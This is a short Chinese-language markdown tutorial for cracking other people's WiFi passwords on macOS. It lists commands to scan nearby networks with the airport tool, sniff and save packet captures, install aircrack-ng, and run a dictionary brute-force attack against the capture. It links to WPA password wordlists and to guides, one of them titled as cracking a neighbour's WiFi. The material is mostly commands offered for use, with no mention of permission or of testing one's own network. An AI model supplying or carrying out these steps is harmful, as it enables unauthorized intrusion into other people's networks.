# 破解 WiFi 密码

## 查看网卡名称

```bash
ifconfig
```

Windows下面是：

```bash
ipconfig
```

## 使用airport监听无线网络

给 `airport` 做一个软链接：

```bash
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```

现在就可以直接使用 `airport` 查看一下附近的 WiFi 信号：

```bash
airport -s
```

- **SSID**: Wi-Fi 名称
- **BSSID**: Wi-Fi 设备的硬件地址
- **RSSI**: 信号强度，值是负数，绝对值越小信号越强
- **CHANNEL**: Wi-Fi 信道
- **HT**: 吞吐量模式，一般都为 Y
- **CC**: 国家，中国为 CN
- **SECURITY**: 加密方式

## 使用airport进行抓包

使用以下命令进行抓包，`1`是指定抓取的信道，如果省略则默认为全部信道。

```bash
airport en1 sniff 1
```

一段时间后`Ctr+c`停止抓包，会生成一个.cap包，看到如下提示

```bash
Session saved to /tmp/airportSniff0RjCAO.cap
```

## 安装 Aircrack-ng

### Windows

```shell
scoop install aircrack-ng
```

### Ubuntu

```shell
sudo apt-get install aircrack-ng
```

### MacOS

```shell
brew install aircrack-ng
```

## 字典

破解都是使用最蠢的暴力破解。因此，需要有密码字典。

- [wpa-dictionary]

## 开始破解

```bash
aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap
```

## 参考资料

- [Wi-Fi Cracking](https://github.com/brannondorsey/wifi-cracking)
- [Wifite](https://github.com/derv82/wifite2)
- [Aircrack-ng](https://www.aircrack-ng.org/downloads.html)
- [教你破解隔壁妹子的 wifi 密码，成功率高达 90%](https://imlifengfeng.github.io/article/15/)
- [aircrack-ng 无线网 WIFI 破解教程(上) – WIFI 破解原理](https://www.vuln.cn/2674)
- [macOS 上使用 aircrack-ng 暴力破解 Wi-Fi 密码](https://blog.csdn.net/qq_27198345/article/details/108425823)
- [通过 Aircrack-ng 等工具获取 Wifi 密码](https://github.com/ZoraZora59/Get_Wifi_Password_On_MacOS)
- [Mac 如何关闭 Wi-Fi 监视模式（Monitor Mode）](https://sysin.org/blog/macos-turn-off-monitor-mode/)

[wpa-dictionary]:(https://github.com/conwnet/wpa-dictionary)
